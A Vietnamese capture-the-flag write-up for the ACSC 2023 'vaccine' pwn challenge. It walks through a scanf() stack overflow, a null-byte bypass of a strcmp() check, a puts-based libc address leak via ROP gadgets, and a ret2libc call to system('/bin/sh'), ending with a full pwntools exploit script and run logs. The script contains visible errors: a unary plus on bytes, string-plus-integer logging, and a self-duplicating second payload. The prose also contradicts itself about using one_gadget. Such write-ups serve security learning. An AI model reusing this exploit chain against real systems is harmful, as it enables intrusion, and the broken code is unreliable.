> From phis1Ng_ with luv
# ACSC 2023 : vaccine - warmup
**Category:** Pwnable
- Link challenge : [vaccine](https://github.com/w1n-gl0ry/CTF/blob/b65dfe3934341213d459b63d3bd81b0a0453f720/2023/ACSC_2023/vaccine/vaccine)


> nc vaccine.chal.ctf.acsc.asia 1337

Bên lề: Đây là Writeup đầu tay trong năm 2023 của mình, nên là có sai sót gì mong mọi người thông cảm nhé :> 



## Write up

# 1. Tìm lỗi:

Đầu tiên, mình dùng lệnh `file` để xem trong file thực thi có gì:
```
vaccine: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a158b3c9f204dc1fdf47fefdac488b0da10fc5b0, for GNU/Linux 3.2.0, not stripped
```
Nah, đây là 1 file executable `64 bit` không bị [stripped](https://stackoverflow.com/questions/4698299/set-breakpoint-in-an-stripped-elf-executable) (stripped là gì thì bấm vào để tham khảo thêm nhé), nên ta có thể dễ dàng tìm kiếm các functions trong `IDA` cũng như `gdb`

Như thường lệ của một người chơi Pwn, tải file về và thả vào `IDA` thôi nào !

Nhìn vào hàm main bên dưới:

![vaccine.png](https://github.com/w1n-gl0ry/CTF/blob/449dc437169f924248351d62c2212c896aa0190d/2023/ACSC_2023/vaccine/image/vaccine.png)

Ta thấy, chương trình tạo mảng s2 sau đó bắt ta nhập vào thông qua hàm `scanf()`, nhìn sơ ta dễ thấy hàm `scanf()` không chỉ định độ dài nhập vào nên xuất hiện lỗ hổng `buffer overflow`.

Mình tiến hành kiểm tra các mitigations của file thực thi để xem có khai thác được gì không, dùng lệnh `checksec` để kiểm tra:

```
[*] '/home/w1n_gl0ry/CTF/Pwnable/ACSC2023/vaccine/bin/vaccine'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Hmm, ta thấy chỉ bits `NX` được bật, có nghĩa là chúng ta không thể exploit bằng cách inject shellcode được, nên ta tiếp tục phân tích hàm main,

![vaccine.png](https://github.com/w1n-gl0ry/CTF/blob/fdd8a08e8b941ed321e7e27b6dbedd0bd22b0b75/2023/ACSC_2023/vaccine/image/Screenshot%202023-03-07%20135509.png)

Chương trình kiểm tra toàn bộ biến s2 với các kí tự ASCII `65`, `67`, `71`, `84` tương ứng với các kí tự `A`, `C`, `G`, `T` mà chương trình gọi là `DNA codes`. Nếu khác kí tự nào thì chương trình sẽ thoát ngay lập tức.

Ngược lại, lúc s2 thõa mãn thì chương trình sẽ tiếp tục kiểm tra với mảng s cho trước gồm các kí tự trong file `RNA.txt`. Rõ ràng, ta không thể đoán được nên phải tìm cách bypass đoạn này. Khi tất cả đều thõa mãn thì chúng ta sẽ nhận được reward (maybe là flag :>)

Đến đây, chúng ta chỉ cần bypass các kí tự `DNA codes` và hàm `strcmp(s, s2)`, từ đó ta có thể ghi đè `return addr` bằng payload mà ta mong muốn.

# 2. Ý tưởng:

Làm sao ta có thể bypass được hàm `strcmp()` trong khi ta không biết trong mảng s có gì ?

-> Mấu chốt chính là hàm `scanf()`, dùng lệnh `man 3 scanf` để xem hàm `scanf()` làm gì:
Hàm `scanf()` vẫn sẽ đọc chuỗi cho đến khi gặp kí tự newlines, nhưng kí tự null bytes thì nó vẫn đọc và lúc kết thúc chuỗi hàm sẽ tự động thêm null bytes vào cuối xâu. Ta lợi dụng điều này để ghi đè qua mảng s một kí tự như s2 để bypass được hàm `strcmp()` . Trong khi đó, hàm `strlen()` vẫn thõa mãn. Tuyệt !

Khi ta đã thõa mãn các điều kiện, việc cuối cùng là ghi đè `return addr` về payload mà chúng ta mong muốn.


# 3. Exploit:

[+] Payload 1: Bypass kí tự DNA codes và hàm `strcmp()` :
-> Ta sẽ điền kí tự `A` vào s2 và lấp đầy các kí tự null cho tới mảng s rồi điền kí tiếp tục tự `A`, hàm sẽ tự động null bytes vào cuối xâu nên không cần quan tâm đến mảng s nữa, việc còn lại là lấp đầy `buf` cho tới `ret addr`

Cách 2: Ta sẽ lấp đầy `buf` cho tới `ret addr` bằng các kí tự null -> cũng thõa mãn.

`payload = (b'A' + (offset s2 -> s) * b'\x00' + b'A').ljust(256, b'\x00')`
hoặc
`payload = payload.ljust(256, b'\x00')`

```
[+] Starting local process './vaccine': pid 15939
[*] running in new terminal: ['/usr/bin/gdb', '-q', './vaccine', '15939', '-x', '/tmp/pwn7i3d52cm.gdb']
[+] Waiting for debugger: Done
[*] Switching to interactive mode
Give me vaccine: Congrats! You give the correct vaccine!
Here is your reward: REDACTED
```
Vậy là đã thành công bước đầu, ta tiếp tục tính payload thứ 2,

[+] Payload 2: Tìm các gadgets phù hợp cho việc leak địa chỉ của hàm nào đó trong thư viện, rồi sau đó tính địa chỉ `libc_base`:

Ta dùng lệnh `ROPgadget --binary vaccine | grep "ret" ` :

```
0x0000000000401443 : pop rdi ; ret
0x0000000000401441 : pop rsi ; pop r15 ; ret
0x000000000040101a : ret
```
-> Có thể những gadgets này sẽ giúp ích trong việc exploit của chúng ta.

```
pop_rdi_ret = 0x401443
pop_rsi_ret = 0x401441
ret = 0x40101a
```
Ta lợi dụng hàm puts để in ra địa chỉ hàm `fopen()` trong thư viện, `payload` như sau:

`payload += <pop_rdi_ret> + <địa chỉ hàm fopen_got> + <địa chỉ hàm puts> + <địa chỉ hàm main>`

Ta quay lại hàm main để địa chỉ hàm `fopen()` được in ra.

```
[+] Starting local process './vaccine': pid 16429
[*] running in new terminal: ['/usr/bin/gdb', '-q', './vaccine', '16429', '-x', '/tmp/pwn6jt6gfhv.gdb']
[+] Waiting for debugger: Done
got_leak: 0x7f0377c7f6b0
libc_base:  0x7f0377c00000
[*] Switching to interactive mode
Congrats! You give the correct vaccine!
Here is your reward: REDACTED
```
Thành công lấy leak được địa chỉ và tính được `libc_base`, việc còn lại của ta là thực thi hàm `system('/bin/sh')` !

[+] Payload 3:
Sau khi có địa chỉ hàm `fopen()` ta sẽ tính được địa chỉ `libc_base` , ta tính địa chỉ hàm `system` và chuỗi `/bin/sh` để chiếm được shell.

Tới đây ta dùng one_gadgets để mọi việc dễ dàng hơn (thật ra là mình đã thử cách khác nhưng không thành, có vẻ như chương trình đã cố tình chặn hàm `system()` :>)


# 4. Chiếm cờ:

Đây là toàn bộ file exploit của mình: [asd.py](https://github.com/w1n-gl0ry/CTF/blob/0da95eda4b2c9730eabe7473c6dbf1fe7e87f927/2023/ACSC_2023/vaccine/asd.py)
```
#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./vaccine')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#r = remote('vaccine.chal.ctf.acsc.asia', 1337)
r = process('./vaccine')

str="""
b* main+417
"""
#gdb.attach(r, str)

pop_rdi_ret = 0x401443
pop_rsi_ret = 0x401441
ret = 0x40101a
payload = b'A' 
payload += + b'\x00'*111
payload += b'A'
payload = payload.ljust(0x100, b'\x00')
payload += p64(0)
payload += p64(pop_rdi_ret)
payload += p64(elf.got['fopen'])
payload += p64(elf.symbols['puts'])
payload += p64(elf.symbols['main'])

r.sendline(payload)

leak = r.recv()
fopen_leak = u64(leak[:6].ljust(8, b"\x00"))
log.info('fopen_leak: ' + fopen_leak)

libc_base = fopen_leak - libc.symbols['fopen']
log.info('libc_base: ' + libc_base)

bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
system = libc_base + libc.symbols['system']
exit = libc_base + libc.symbols['exit']

payload = b'A' 
payload += b'\x00'*111
payload += b'A'
payload += payload.ljust(0x100, b'\x00')
payload += p64(0)
payload += p64(pop_rdi_ret)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)
payload += p64(exit)

r.sendline(payload)
r.interactive()
```
Chúc mọi người 1 tuần tốt lành !!




